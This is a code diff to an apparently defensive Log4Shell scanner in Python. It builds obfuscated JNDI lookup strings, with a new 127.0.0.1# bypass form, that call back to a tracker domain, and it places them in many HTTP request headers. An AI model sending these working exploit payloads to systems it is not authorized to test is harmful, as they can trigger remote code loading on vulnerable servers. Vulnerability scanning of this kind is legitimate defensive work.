@@ -39,16 +39,17 @@ def randomword(length):
 def payload(domain, header):
     hashed_domain = hashlib.md5(domain.encode('utf-8')).hexdigest()
     encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
-    payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
+    payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://127.0.0.1#" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
     to_json({'domain': domain, 'header': header, 'payload': payload})
     return payload
 
 def log4shell(domain):
     fakedomain = randomword(10)
+    to_json({'domain': domain, 'fake': fakedomain})
     try:
         headers = {
-            'User-Agent':payload(fakedomain, "User-Agent"),
-            'Referer':payload(fakedomain, "Referer"),
+            'User-Agent': payload(fakedomain, "User-Agent"),
+            'Referer': payload(fakedomain, "Referer"),
             'X-Api-Version': payload(fakedomain, "X-Api-Version"),
             'X-Csrf-Token': payload(fakedomain, 'X-Csrf-Token'),
             'X-CSRFToken': payload(fakedomain, 'X-CSRFToken'),
